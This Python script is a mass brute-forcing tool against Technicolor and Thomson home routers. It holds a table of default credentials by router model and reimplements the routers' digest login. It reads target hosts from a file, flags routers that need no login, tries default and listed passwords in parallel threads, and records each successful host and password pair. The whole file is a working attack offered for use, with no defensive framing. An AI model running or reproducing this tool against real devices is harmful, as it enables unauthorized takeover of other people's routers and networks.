import requests
import hashlib
import threading


defaults = {
"7230s": [""  "admin"],
"7300b": ["unknown","unknown"],
"DPC3939": ["admin","password"],
"TC7200": ["admin","admin"],
"TC7200-U": ["admin","admin"],
"TC7210.dNZ": [""  "admin"],
"TC7230": ["admin","admin"],
"TC8305C": ["admin","password"],
"TC8715D": ["admin","password"],
"TG670":["blank","blank"],
"TD5130": ["admin","admin"],
"TD5136v2": ["admin","admin"],
"TG582n": ["admin","blank"],
"TG582n-O2": ["Administrator","blank"],
"TG587n": ["admin","admin"],
"TG587n": ["admin","admin"],
"TG589vn": ["admin","admin"],
"TG784n":["Administrator","blank"],
"TG788vn": ["unknown","unknown"],
"TG788vn": ["Administrator","blank"],
"TG789vn":["admin","blank"],
"TG799vn": ["admin","password"],
"TG852n":["admin","1234"]

}


def Brute(host, i):

	s = requests.session()

	s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"})
	s.headers.update({"Referer" : host + "/login.lp"})
	s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
	s.headers.update({"Content-Type":"application/x-www-form-urlencoded"})

	text = s.get(host + "/login.lp").text

	#BUILD login stuff
	realm = "Technicolor Gateway"
	nonce = text.split('var nonce = "')[1].split('"')[0]
	qop = "auth"
	uri = "/login.lp"
	rn = text.split('<input type="hidden" name="rn" value="')[1].split('"')[0]

	version = text.split("var headerText = '")[1].split(" ")[1].split("'")[0]

	username = ""
	password = ""

	if version in defaults.keys():#If we have its default credentials
		print(f"[{i}] Found router {host} | Version {version} | Found Default Creds {defaults[version][0]}:{defaults[version][1]}")

		if defaults[version][0] == "blank":
			username = ""
		else:
			username =  defaults[version][0]

		if defaults[version][1] == "blank":
			password = ""
		else:
			password = defaults[version][1]

		HA1 = hashlib.md5((username + ":" + realm + ":" + password).encode()).hexdigest()
		HA2 = hashlib.md5(("GET" + ":" + uri).encode()).hexdigest()
	
		hidepw = hashlib.md5((HA1 + ":" + nonce + ":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2).encode()).hexdigest()
	
		text = s.post(host+"/login.lp", data="rn=" + rn + "&hidepw=" + hidepw + "&user=" + username).text

		if "isplay level" in text:
			print(f"[{i}] Successfull login {host} | Version {version} | Default credentials {username}:{password}")
			with open("output.txt", "a+") as outfile:
				outfile.write(f"{host} --> {username}:{password}\n")
			return

		else:
			print(f"[{i}] Found router {host} | Version {version} | Default credentials failed :( going full brute")

	else:
		print(f"[{i}] Found router {host} | Version {version} | No default credentials found going full brute")

	for _, combo in defaults.items():
		try:
			text = s.get(host + "/login.lp").text

			#BUILD login stuff
			realm = "Technicolor Gateway"
			nonce = text.split('var nonce = "')[1].split('"')[0]
			qop = "auth"
			uri = "/login.lp"
			rn = text.split('<input type="hidden" name="rn" value="')[1].split('"')[0]

			username = combo[0]
			password = combo[1]
			HA1 = hashlib.md5((username + ":" + realm + ":" + password).encode()).hexdigest()
			HA2 = hashlib.md5(("GET" + ":" + uri).encode()).hexdigest()
		
			hidepw = hashlib.md5((HA1 + ":" + nonce + ":" + "00000001" + ":" + "xyz" + ":" + qop + ":" + HA2).encode()).hexdigest()
		
			text = s.post(host+"/login.lp", data="rn=" + rn + "&hidepw=" + hidepw + "&user=" + username).text
	
			if "isplay level" in text:
				print(f"[{i}] Successfull login {host} | Credentials {username}:{password}")
				with open("output.txt", "a+") as outfile:
					outfile.write(f"{host} --> {username}:{password}\n")
				return
			else:
				print(f"[{i}] Bad login {host} | Version {version} | Credentials {username}:{password}")
		except:
			pass


hosts = open("hosts.txt").read().split('\n')

if len(hosts) == 0:
	print("No hosts loaded...")
	exit(0)

i =0
for host in hosts:

	if len(host) > 20:
		pass
	s = requests.session()
	try:
		text = s.get(host + "/cgi/b/users/usrpage/", allow_redirects=True).text
	except:
		pass
	if "Pick a task" in text:
		userlevel = text.split('You\'re currently logged in as [ ')[1].split(' ]')[0]
		print(f"[+] Unlocked router :P --> {host} user {userlevel}")
		with open("output.txt", "a+") as outfile:
			outfile.write(f"{host} --> unlocked\n")
	else:
		print(f"Locked router, bruting {host}")
		threading.Thread(target=Brute, args=(host,i,)).start()
	i = i + 1

	
		